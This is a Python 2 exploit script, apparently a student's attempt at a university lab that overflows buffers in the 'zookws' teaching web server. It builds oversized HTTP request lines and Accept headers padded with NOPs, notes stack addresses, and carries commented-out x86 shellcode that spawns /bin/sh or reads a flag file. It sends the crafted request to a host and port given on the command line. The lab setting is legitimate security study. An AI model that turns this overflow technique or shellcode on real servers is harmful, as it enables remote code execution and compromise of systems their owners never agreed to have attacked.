#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xdeadc0de
stack_saved_ebp = 0xdeadc0de
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    
    # Part 1
    req =  "GET%s%s /a HTTP/1.0\r\n\r\n" % (''*4200, "SLKDJFLSJDFLKJL")
    # Part 2
    req =  "GET /answers.txt/%s HTTP/1.0\r\n\r\n"  % ("a"*1048)
    # Part 3
    # req =  "GET /answers.txt HTTP/1.0\r\n"
    # overflow_header = "Accept: " + "a"*4200 + "\x90"*100 + "\r\n"
    # req += overflow_header 
    # req += "\r\n"
    return req
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    ## TODO: EXPLOIT
    ## buf = 0xbfea8a50, 4096 bytes buffer passed over to http_read_line function
    ## http_read_line ebp = 0xbfea8a38
    ## http_request_line ebp = 0xbfea9a68
    pos_http_request_line_ebp = chr(0xd8) + chr(0xdd) + chr(0xff) + chr(0xbf)
    # nop_slide = chr(0x90) * 12
    nop_slide = chr(0x90)
    # shellcode = chr(0x31) + chr(0xc0) + chr(0x50) + chr(0x68) + chr(0x2f) + chr(0x2f) + chr(0x73) + chr(0x68) + chr(0x68) + chr(0x2f) + chr(0x62) + chr(0x69) + chr(0x6e) + chr(0x89) + chr(0xe3) + chr(0x50) + chr(0x89) + chr(0xe2) + chr(0x53) + chr(0x89) + chr(0xe1) + chr(0xb0) + chr(0x0b) + chr(0xcd) + chr(0x80)
    # shellcode = chr(0x55) + chr(0x89) + chr(0xe5) + chr(0x31) + chr(0xc0) + chr(0x50) + chr(0x68) + chr(0x2f) + chr(0x63) + chr(0x61) + chr(0x74) + chr(0x68) + chr(0x2f) + chr(0x62) + chr(0x69) + chr(0x6e) + chr(0x89) + chr(0xe3) + chr(0x50) + chr(0x68) + chr(0x2e) + chr(0x74) + chr(0x78) + chr(0x74) + chr(0x68) + chr(0x66) + chr(0x6c) + chr(0x61) + chr(0x67) + chr(0x50) + chr(0x8d) + chr(0x4c) + chr(0x24) + chr(0x04) + chr(0x51) + chr(0x53) + chr(0x89) + chr(0xe1) + chr(0x50) + chr(0x89) + chr(0xe2) + chr(0xb0) + chr(0x11) + chr(0xcd) + chr(0x80) + chr(0x90) + chr(0xc9) + chr(0xc3) 
    # queryString = "a"*100 + pos_http_request_line_ebp + nop_slide + shellcode
    # queryString = "answers.txt"
    url = "answers.txt"
    queryString = "?q&cp=0&client=psy-ab&xssi=t&gs_ri=gws-wiz&hl=en-IN&authuser=0&pq=view%20raw%20headers%20chrome&psi=HpaWXIC9PNGSwgOh9rvgCg.1553372704027&ei=HpaWXIC9PNGSwgOh9rvgCg" 
    # queryString = "/zoobar/index.cgi/login?nexturl=http://192.168.56.3:8080/zoobar/index.cgi/" 
    headers = [
            "Referer: https://example.com/",
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"
            ]
    raw_headers = [i + "\r\n" for i in headers]
    req =  "GET /%s%s HTTP/1.0\r\n" % (url, queryString)
    for i in raw_headers: 
        req += i
    overflow_header = "Accept: " + "a"*4100 + "\x90"*100 + "\r\n"
    req += overflow_header 
    req += "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

